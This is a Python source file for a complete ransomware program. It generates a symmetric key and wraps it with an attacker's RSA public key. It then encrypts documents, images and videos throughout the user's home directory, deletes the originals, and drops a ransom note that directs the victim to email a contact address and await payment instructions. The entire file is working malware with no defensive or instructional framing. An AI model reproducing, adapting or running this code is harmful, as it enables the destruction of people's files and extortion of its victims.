from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key
import os
from utils import iterator, get_script_directory, get_home_directory


class SimpleCrypter:
    def __init__(self):
        self.key = None
        self.crypter = None
        self.public_key = None
        self.file_exts = ['txt', 'doc', 'pdf', 'jpg', 'png', 'mp4', 'mov', 'docx']
        self.exclude_dirs = [os.path.abspath('keys'), get_script_directory()]

    def generate_key(self):
        # Generate a new Fernet key
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def encrypt_fernet_key(self):
        # Path to the public key
        public_key_path = os.path.join(get_script_directory(), 'keys', 'public_key.pem')

        with open(public_key_path, 'rb') as f:
            self.public_key = load_pem_public_key(f.read())

        # Encrypt the Fernet key with the public key
        encrypted_key = self.public_key.encrypt(
            self.key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # Save the encrypted Fernet key in the correct directory
        self.save_encrypted_fernet_key(encrypted_key)

    def save_encrypted_fernet_key(self, encrypted_key):
        # Directory for keys
        keys_dir = os.path.join(get_script_directory(), 'keys')

        # Path to save the encrypted Fernet key
        encrypted_fernet_key_path = os.path.join(keys_dir, 'encrypted_fernet_key.bin')

        # Save the encrypted Fernet key
        with open(encrypted_fernet_key_path, 'wb') as f:
            f.write(encrypted_key)
        print(f"Encrypted Fernet key saved at: {encrypted_fernet_key_path}")

    def crypt_file(self, file_path, encrypt=True):
        try:
            with open(file_path, 'rb') as file:
                data = file.read()

            if encrypt:
                _data = self.crypter.encrypt(data)
                new_file_path = file_path + '.encrypted'
            else:
                _data = self.crypter.decrypt(data)
                new_file_path = file_path[:-10]  # Remove '.encrypted'

            with open(new_file_path, 'wb') as file:
                file.write(_data)

            if encrypt:
                os.remove(file_path)

            print(f"{'Encrypted' if encrypt else 'Decrypted'}: {file_path}")
        except Exception as e:
            print(f"Error processing {file_path}: {e}")

    def should_encrypt(self, file_path):
        # Check if the file should be encrypted
        for dir in self.exclude_dirs:
            if file_path.startswith(dir):
                return False

        file_name = os.path.basename(file_path)
        if file_name.startswith('.') or file_name.startswith('~'):
            return False

        return file_path.split('.')[-1] in self.file_exts

    def crypt_system(self, encrypt=True):
        # Get the home directory
        system_root = get_home_directory()

        # Get the list of files to encrypt
        files_to_encrypt = iterator(system_root, exclude_dirs=self.exclude_dirs, allowed_extensions=self.file_exts)

        for file_path in files_to_encrypt:
            if encrypt:
                if not file_path.endswith('.encrypted'):
                    self.crypt_file(file_path, encrypt=True)
            else:
                if file_path.endswith('.encrypted'):
                    self.crypt_file(file_path, encrypt=False)

    def create_instruction_file(self):
        # Create an instruction file for the user
        instruction = """
    Your files have been encrypted.
    To decrypt them, follow these instructions:
    1. Contact us at decrypt@example.com
    2. Send the 'encrypted_fernet_key.bin' file to us
    3. Wait for instructions for payment and decryption
    DO NOT attempt to decrypt the files yourself as this may cause permanent data loss.
    """
        with open('INSTRUCTIONS.txt', 'w') as f:
            f.write(instruction)


def main():
    crypter = SimpleCrypter()
    crypter.generate_key()  # Generate the Fernet key
    crypter.encrypt_fernet_key()  # Encrypt the Fernet key and save it
    crypter.crypt_system(encrypt=True)  # Encrypt the files
    crypter.create_instruction_file()  # Create the instruction file


if __name__ == '__main__':
    main()